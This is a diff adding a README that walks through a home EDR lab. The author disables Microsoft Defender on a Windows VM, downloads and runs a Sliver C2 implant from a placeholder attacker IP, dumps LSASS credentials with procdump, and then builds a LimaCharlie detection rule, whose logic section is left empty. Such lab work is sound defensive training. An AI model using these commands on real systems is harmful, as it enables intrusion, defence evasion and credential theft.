@@ -1,2 +1,400 @@
 # EDR Attack and Defense Home Lab 
 Endpoint Security and Threat Simulation Using Sliver C2 for threat simulation and LimaCharlie for EDR
+
+# EDR Attack and Defense Home Lab
+
+## Overview
+This project is designed to simulate real-world cybersecurity scenarios, focusing on both attack and defense. I set up a home lab using virtual machines to simulate a Ubuntu attacker (using Sliver C2) and a Windows VM victim (protected by LimaCharlie EDR). The goal was to understand endpoint security, threat detection, and incident response in a controlled environment.
+
+## Tools Used
+- **Sliver**: Command and Control (C2) framework
+- **LimaCharlie**: Endpoint Detection and Response (EDR) and SIEM platform
+- **VMware Workstation Pro**: Virtualization software
+- **Ubuntu Server 22.04.1**: Attack machine
+- **Windows 11**: Victim machine
+
+---
+
+## Step-by-Step Walkthrough
+
+# Setting Up a Virtualization Environment
+
+Firstly, I set up a small virtualization environment. This was an essential foundation for my attack and defense simulations.
+
+---
+
+## Setting Up the Windows VM
+
+### Downloading and Importing the VM
+I download a free Windows 11 VM ISO from Microsoft’s site.
+
+### First Boot
+1. Powered on the Windows VM.
+2. Logged in automatically as the user called 'localadmin'.
+
+---
+
+## Setting Up the Ubuntu VM
+
+### Downloading Ubuntu Server
+I went for Ubuntu Server 22.04.1 because it comes pre-installed with necessary packages, making the setup much easier than using the Desktop version.
+
+### VM Configuration
+Here are the specs I used for the Ubuntu VM:
+- Disk size: 14GB
+- CPU cores: 2
+- RAM: 2GB
+
+I created the VM in VMware using the Ubuntu Server ISO and left most installation settings as defaults.
+
+### Static IP Configuration
+To ensure stable communication between the VMs:
+1. Opened VMware’s **Virtual Network Editor**.
+2. Noted the **Subnet IP** and **Gateway IP** from the NAT network settings.
+3. In the Ubuntu installer, switched from DHCPv4 to Manual configuration.
+4. Entered the noted IPs, adding `/24` to the subnet IP.
+5. Completed the network setup and wrote down the assigned static IP.
+
+### Finalizing Ubuntu Setup
+1. Set a memorable username and password for the VM
+2. Installed the OpenSSH server when prompted.
+3. Rebooted the system.
+4. Performed a connectivity check:
+   ```bash
+   ping -c 2 google.com
+   ```
+   Seeing successful pings confirmed everything was working correctly up so far.
+
+---
+
+## Disabling Microsoft Defender on Windows VM
+This was an important step to ensure the lab environment didn’t interfere with the attack simulations. Missing anything here would mean redoing a lot of steps.
+
+### Steps to Disable Defender
+1. **Disable Tamper Protection:**
+   - Navigated to **Privacy & Security > Windows Security > Virus & Threat Protection > Manage Settings**.
+   - Turned off **Tamper Protection** and all other options.
+![Picture1](https://github.com/user-attachments/assets/f69234eb-4ecc-44ef-b297-424e6b995702)
+
+![Picture2](https://github.com/user-attachments/assets/d1899835-b91d-4e5f-b576-f4cd8c14bfab)
+
+2. **Group Policy Editor:**
+   - Opened the Local Group Policy Editor using:
+     ```cmd
+     gpedit.msc
+     ```
+   - Enabled the setting: **Turn off Microsoft Defender Antivirus**.
+![Picture3](https://github.com/user-attachments/assets/3f9f5290-66e4-4fe4-8cf4-bfe1fc8cb159)
+
+3. **Registry Edits:**
+   - Ran the following command in an elevated command prompt:
+     ```cmd
+     REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+     ```
+![Picture4](https://github.com/user-attachments/assets/8fde9177-0f6b-402d-a7b6-9f18bca03fc6)
+
+4. **Safe Mode Adjustments:**
+   - Booted into Safe Mode and disabled several Defender services in the Registry by setting their `Start` values to `4`.
+![Picture5](https://github.com/user-attachments/assets/f57043b8-3ff8-4f1d-9d06-7cc349a2a134)
+
+![Picture6](https://github.com/user-attachments/assets/af916feb-1db6-4f7b-b4ef-fb474845e685)
+
+![Picture7](https://github.com/user-attachments/assets/f33787c4-daee-4dbd-ba72-68479caf22b6)
+
+![Picture8](https://github.com/user-attachments/assets/8d611128-fefe-478a-a7e6-804455bf4b24)
+
+![Picture9](https://github.com/user-attachments/assets/4642f18e-d27a-4e2d-a830-dd95c2d94c8d)
+
+![Picture10](https://github.com/user-attachments/assets/9f1f3666-3f8f-447d-90ca-1fabe712b518)
+
+![Picture11](https://github.com/user-attachments/assets/458c87b2-221a-46ac-994f-ea6f5eab94a7)
+
+5. Rebooted back into the normal desktop environment.
+
+![Picture12](https://github.com/user-attachments/assets/87270251-3343-4d70-a292-dc9ce5999f77)
+
+
+---
+
+## Preventing Sleep Mode
+To keep the Windows VM running without interruptions:
+```powershell
+powercfg /change standby-timeout-ac 0
+powercfg /change standby-timeout-dc 0
+powercfg /change monitor-timeout-ac 0
+powercfg /change monitor-timeout-dc 0
+powercfg /change hibernate-timeout-ac 0
+powercfg /change hibernate-timeout-dc 0
+```
+![Picture13](https://github.com/user-attachments/assets/172184d2-1239-4253-b4db-841fe4058da7)
+
+---
+
+## Installing Sysmon on Windows VM
+Although not directly required for the initial setup and not directly used in the project, Sysmon is a must-have for telemetry. Here’s what I did (just for familiarizing myself with it purposes):
+1. Downloaded Sysmon:
+   ```powershell
+   Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
+   ```
+2. Unzipped the package and downloaded a configuration file from SwiftOnSecurity:
+   ```powershell
+   Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
+   Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
+   ```
+3. Installed Sysmon with the configuration file:
+   ```powershell
+   C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
+   ```
+4. Verified the installation:
+   ```powershell
+   Get-Service sysmon64
+   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
+   ```
+
+---
+
+# Generating and Observing C2 Payloads
+
+Here is where I step into the attacker’s shoes to generate and deploy a C2 payload using the Sliver C2 framework. This experience gave me hands-on exposure to adversarial tactics and how EDR systems like LimaCharlie detect them.
+
+---
+
+## Setting Up Sliver and Generating the Payload
+
+To begin, I jumped into an SSH session on my Ubuntu attack VM and navigated to the Sliver installation directory:
+
+```bash
+sudo su
+cd /opt/sliver
+```
+
+From here, I launched the Sliver server:
+
+```bash
+sliver-server
+```
+
+Within the Sliver shell, I generated a C2 session payload, ensuring it used the statically assigned IP of my attack VM:
+
+```bash
+generate --http [Linux_VM_IP] --save /opt/sliver
+```
+
+This created a unique payload file, which I noted for future reference. The `implants` command within Sliver confirmed the configuration of my new payload:
+
+```bash
+implants
+```
+
+After verifying the implant, I exited Sliver to prepare for transferring the payload to the target Windows VM.
+
+---
+
+## Transferring the Payload
+
+To transfer the payload, I spun up a temporary Python web server on the Ubuntu VM:
+
+```bash
+cd /opt/sliver
+python3 -m http.server 80
+```
+
+Switching to the Windows VM, I opened an Administrative PowerShell console and downloaded the payload:
+
+```powershell
+IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+```
+
+At this point, I took a snapshot of the Windows VM, naming it **"Malware staged"**. This ensured I could revert to a clean state if needed.
+
+---
+
+## Executing the Payload
+
+Back on the Ubuntu VM, I relaunched Sliver and started the HTTP listener to catch callbacks from the implant:
+
+```bash
+sliver-server
+http
+```
+
+Returning to the Windows VM, I executed the payload from the Administrative PowerShell console:
+
+```powershell
+C:\Users\User\Downloads\[payload_name].exe
+```
+
+Within moments, the session checked in on the Sliver server. I verified the active session:
+
+```bash
+sessions
+```
+
+To interact with the session, I used:
+
+```bash
+use [session_id]
+```
+
+---
+
+## Exploring the Victim System
+
+Once the session was active, I ran several basic commands to explore the victim system:
+
+1. **Session Details:**
+   ```bash
+   info
+   ```
+
+2. **User and Privileges:**
+   ```bash
+   whoami
+   getprivs
+   ```
+   This confirmed the implant had administrative privileges, including the critical `SeDebugPrivilege`.
+
+3. **Working Directory:**
+   ```bash
+   pwd
+   ```
+
+4. **Network Connections:**
+   ```bash
+   netstat
+   ```
+   Sliver highlighted its own process in green, making it easy to spot.
+
+5. **Running Processes:**
+   ```bash
+   ps -T
+   ```
+   Defensive tools, like LimaCharlie’s `rphcp.exe`, were marked in red.
+
+---
+
+## Observing EDR Telemetry in LimaCharlie
+
+With the C2 session established, I switched to LimaCharlie’s web UI to observe the telemetry:
+
+### Processes Tab
+- The process tree displayed all running processes, highlighting the unsigned C2 implant.
+- Hovering over icons provided additional context, reinforcing the importance of understanding normal process behavior.
+
+### Network Tab
+- Active connections, including those initiated by the implant, were easily identifiable.
+- Searching for the implant’s name or C2 IP address quickly pinpointed suspicious activity.
+
+### File System Tab
+- Browsed to the implant’s directory: `C:\Users\User\Downloads`.
+- Scanned the executable’s hash with VirusTotal. As expected, it wasn’t in the database, making it more suspicious.
+
+### Timeline Tab
+- Filtered logs by known Indicators of Compromise (IOCs) like the implant name and C2 IP.
+- Tracked events such as `SENSITIVE_PROCESS_ACCESS` when enumerating privileges earlier.
+
+---
+
+# Emulating an Adversary for Detection Crafting
+
+Now I use the setup to detect suspicious activities. The goal was to not just replicate attacker behavior but to create a meaningful detection rule to identify these activities in real-time.
+
+---
+
+## Privilege Check
+
+Before proceeding, I ensured the implant had sufficient privileges:
+
+```bash
+getprivs
+```
+
+The key privilege to look for was `SeDebugPrivilege`, which, as I learned, is important for advanced actions like credential dumping. If this privilege wasn’t present, I would relaunch the implant with administrative rights as mentioned in the guide.
+
+---
+
+## Credential Dumping: Targeting LSASS
+
+One of the most common adversarial techniques involves dumping the `lsass.exe` process from memory to extract credentials. Here’s how I simulated this:
+
+1. Ran the following command in the Sliver session:
+   ```bash
+   procdump -n lsass.exe -s lsass.dmp
+   ```
+2. This dumped the process memory and saved it as `lsass.dmp` on the Sliver C2 server.
+
+Although I didn’t process the dump further, the activity itself generated telemetry that I could analyze in the EDR. This technique is an excellent test for any EDR's ability to detect credential dumping attempts.
+
+### Troubleshooting
+- If the command failed (e.g., RPC error), I confirmed the implant was running with admin rights.
+- Even a failed attempt can generate valuable telemetry for detection, which is what happened to me.
+
+---
+
+## Diving into LimaCharlie: Detecting LSASS Access
+
+Switching to LimaCharlie, I began searching for telemetry related to the LSASS dump:
+
+### Timeline Analysis
+
+1. Opened the **Timeline** view for my Windows VM sensor.
+2. Filtered events by type: `SENSITIVE_PROCESS_ACCESS`.
+3. Scanned the results for any events involving `lsass.exe`. Since LSASS is rarely accessed legitimately, any such event was a strong indicator of malicious activity.
+
+## Creating a Detection Rule
+
+With the telemetry in hand, I moved to the D&R (Detection and Response) engine in LimaCharlie to create a rule:
+
+### Detection Logic
+
+### Response Action
+
+1. In the **Respond** section, I added:
+   ```yaml
+   - action: report
+     name: LSASS access
+   ```
+   For simplicity, the rule generated a detection report whenever triggered. More advanced actions like killing the offending process could be added later.
+
+### Testing the Rule
+
+1. Used the "Target Event" feature to test the rule against the telemetry.
+2. Confirmed a successful match, with the engine highlighting the exact event details.
+3. Saved the rule as "LSASS access" and enabled it.
+
+---
+
+## Validating the Detection Rule
+
+Returning to the Sliver session, I reran the LSASS dump command:
+
+```bash
+procdump -n lsass.exe -s lsass.dmp
+```
+
+Back in LimaCharlie:
+
+1. Opened the **Detections** tab.
+2. Found a new detection entry corresponding to the second LSASS dump attempt.
+3. Expanded the detection to view the raw event data, which displayed the title of the detection rule I created.
+4. Verified that it worked and detected the event automatically by navigating to the exact timeline event using the "View Event Timeline" option.
+
+---
+
+### Configuring the Detection Output
+
+To ensure I am notified whenever the detection rule is triggered, I took it a step further and configured the output to be sent to a webhook. Here's how I set it up:
+
+1. Generated a unique webhook URL using [`https://webhook.site/`](https://webhook.site/).
+2. Configured the detection rule in LimaCharlie to send its output to the generated webhook.
+
+---
+
+## References
+- Eric Capuano’s Guide: [So You Want to Be a SOC Analyst?](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro)
+- [Sliver C2 Documentation](https://github.com/BishopFox/sliver)
+- [LimaCharlie Documentation](https://limacharlie.io/)
+
+---
+
+Feel free to explore this repository and try the steps yourself! This was an incredibly rewarding project, and I’d love to hear your thoughts or answer any questions!
